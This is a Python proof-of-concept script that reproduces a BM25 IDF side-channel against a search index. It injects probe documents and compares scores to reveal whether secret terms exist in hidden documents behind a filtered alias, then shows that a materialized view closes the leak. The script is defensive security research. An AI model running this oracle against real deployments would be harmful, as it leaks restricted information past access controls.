"""Security PoC: reproduce the ExactOracle BM25 side-channel LOCALLY and show it
is present through a filtered alias (== DLS post-filtering) but ABSENT through a
materialized view (physical isolation).

Threat model (from main.pdf, adapted): an authorized-but-restricted user can
WRITE documents to the index (or a shared ingest path) but may only READ the
cardiology subset. SECRET_TERMS appear only in hidden (non-cardiology) docs.

ExactOracle mechanism:
  BM25 idf(t) = log(1 + (N - df + 0.5)/(df + 0.5)), where N, df are corpus-wide.
  The attacker injects ONE visible (cardiology) probe doc containing term t and
  queries for t. The score of that probe doc depends on df(t) over the WHOLE
  shard. A term that also appears in many hidden docs has a HIGHER df -> LOWER
  idf -> LOWER score than a fresh control term with the same visible df=1.
  Comparing scores reveals whether t exists in hidden documents.

  - Through the filtered alias: scoring uses full-index df -> leak.
  - Through the MV: hidden docs were never copied, so df(t) counts only the
    probe doc, identical to a control term -> no score gap -> closed.
"""
import json
import lib

CONTROL = ["zzqxkjp", "wqjxvbm", "kkxzqfd", "jjxvvnu", "vvkqzrt",
           "mmzxqwp", "ppqjxzv", "ttkxzqm"]


def inject(index, term):
    """Insert one cardiology (visible) probe doc containing `term`. Returns id."""
    r = lib.post(f"/{index}/_doc", {"dept": lib.VISIBLE_DEPT,
                                    "content": f"probe {term}",
                                    "value": 1, "category": "cat-0",
                                    "user_id": "probe", "ts": 1_700_000_000_000})
    lib.refresh(index)
    return r["_id"]


def probe_score(index, term):
    """Return BM25 score of the probe doc when querying `term` (via index/alias)."""
    r = lib.get(f"/{index}/_search",
                {"size": 1, "query": {"match": {"content": term}}})
    hits = r["hits"]["hits"]
    return hits[0]["_score"] if hits else None


def run_oracle(query_target, inject_target, label):
    """query_target: alias or MV name we READ through.
    inject_target: index we WRITE the probe into (source for alias, mv for mv)."""
    print(f"\n[ExactOracle via {label}]")
    print(f"{'term':14s} {'kind':8s} {'score':>9s}   (lower score => term also in hidden docs)")
    print("-" * 64)
    ids = []
    secret_scores, control_scores = [], []
    for t in lib.SECRET_TERMS:
        _id = inject(inject_target, t)
        ids.append((inject_target, _id))
        s = probe_score(query_target, t)
        secret_scores.append(s)
        print(f"{t:14s} {'SECRET':8s} {s:>9.4f}")
    for t in CONTROL:
        _id = inject(inject_target, t)
        ids.append((inject_target, _id))
        s = probe_score(query_target, t)
        control_scores.append(s)
        print(f"{t:14s} {'control':8s} {s:>9.4f}")

    # cleanup probes
    for idx, _id in ids:
        lib.delete(f"/{idx}/_doc/{_id}")
    lib.refresh(inject_target)

    ss = [s for s in secret_scores if s is not None]
    cs = [s for s in control_scores if s is not None]
    avg_secret = sum(ss) / len(ss) if ss else 0
    avg_control = sum(cs) / len(cs) if cs else 0
    gap = avg_control - avg_secret
    # A term is "detected as hidden" only if its score sits BELOW the control band
    # by a meaningful margin (>5% of the control score). This rejects the sub-0.1%
    # float noise from BM25 field-length norms that the MV exhibits.
    ctrl_min = min(cs) if cs else 0
    margin = 0.05 * avg_control if avg_control else 0
    detected = sum(1 for s in ss if s < ctrl_min - margin)
    print(f"  avg SECRET score  = {avg_secret:.4f}")
    print(f"  avg control score = {avg_control:.4f}")
    print(f"  score gap (control - secret) = {gap:.4f}")
    print(f"  secret terms detectable as hidden: {detected}/{len(ss)}")
    return {"avg_secret": round(avg_secret, 4),
            "avg_control": round(avg_control, 4),
            "gap": round(gap, 4),
            "detected": detected,
            "total": len(ss)}


def main():
    print("=" * 72)
    print(" ExactOracle side-channel: filtered alias (post-filter) vs MV")
    print("=" * 72)

    alias_res = run_oracle(lib.ALIAS, lib.SOURCE_INDEX, "filtered alias (DLS-equiv)")
    mv_res = run_oracle(lib.MV_INDEX, lib.MV_INDEX, "materialized view")

    report = {"alias": alias_res, "mv": mv_res}
    with open("poc/security_metrics.json", "w") as f:
        json.dump(report, f, indent=2)

    print("\n" + "=" * 72)
    print(" SUMMARY")
    print("=" * 72)
    print(f"  Filtered alias: secret terms leaked = {alias_res['detected']}/{alias_res['total']}"
          f"  (score gap {alias_res['gap']:.4f})")
    print(f"  Materialized view: secret terms leaked = {mv_res['detected']}/{mv_res['total']}"
          f"  (score gap {mv_res['gap']:.4f})")
    print("\n  The alias leaks because BM25 IDF is computed over the full shard")
    print("  (hidden docs inflate df -> depress score). The MV cannot leak because")
    print("  hidden docs were never physically copied into it.")


if __name__ == "__main__":
    main()
